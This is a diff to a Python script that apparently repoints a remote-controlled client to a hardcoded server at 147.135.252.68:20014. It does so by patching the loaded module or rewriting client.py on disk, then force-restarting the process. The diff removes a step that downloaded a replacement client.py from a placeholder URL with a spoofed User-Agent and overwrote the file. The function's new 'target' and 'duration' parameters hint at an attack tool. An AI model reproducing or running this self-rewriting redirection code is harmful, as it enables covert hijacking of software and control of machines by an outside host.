@@ -14,27 +14,33 @@ import dns.resolver
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def change_server():
+def change_server(target, duration=60):
     """Change client server configuration to 147.135.252.68:20014"""
     new_host = "147.135.252.68"
     new_port = 20014
     
     try:
-        # Method 1: Direct module modification
+        # Method 1: Direct module modification with forced restart
         try:
             import client
+            import sys
+            import os
+            
             client._CONFIG_DATA['host'] = new_host
             client._CONFIG_DATA['port'] = new_port
             print(f"Successfully changed client config to {new_host}:{new_port}")
-            return
+            
+            # Method A: Force restart entire client
+            print("Restarting client to apply new configuration...")
+            os.execl(sys.executable, sys.executable, *sys.argv)
+            
         except Exception as e:
             print(f"Direct modification failed: {e}")
         
-        # Method 2: File modification
+        # Method 2: File modification (your existing code)
         import os
         import re
         
-        # Find client.py in current directory or parent
         possible_paths = [
             "client.py",
             os.path.join(os.path.dirname(__file__), "client.py"),
@@ -47,7 +53,6 @@ def change_server():
                     with open(client_path, "r", encoding="utf-8") as f:
                         content = f.read()
                     
-                    # Replace the configuration
                     new_config = """_CONFIG_DATA = {
     'host': '147.135.252.68',
     'port': 20014,
@@ -64,33 +69,14 @@ def change_server():
                         f.write(updated_content)
                     
                     print(f"Updated {client_path} with new server {new_host}:{new_port}")
-                    break
+                    
+                    # Force restart after file modification
+                    import sys
+                    import os
+                    os.execl(sys.executable, sys.executable, *sys.argv)
                     
                 except Exception as e:
                     print(f"Failed to modify {client_path}: {e}")
-        
-        # Method 3: Download replacement client
-        try:
-            import urllib.request
-            # Download a pre-configured client from a URL
-            new_client_url = "https://your-github-url/client_preconfigured.py"
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            req = urllib.request.Request(new_client_url, headers=headers)
-            
-            with urllib.request.urlopen(req) as response:
-                new_client_data = response.read()
-            
-            # Replace current client
-            current_dir = os.path.dirname(os.path.abspath(__file__))
-            client_path = os.path.join(current_dir, "client.py")
-            
-            with open(client_path, "wb") as f:
-                f.write(new_client_data)
-            
-            print("Client replaced with pre-configured version")
-            
-        except Exception as e:
-            print(f"Download replacement failed: {e}")
             
     except Exception as e:
         print(f"Server change failed: {e}")
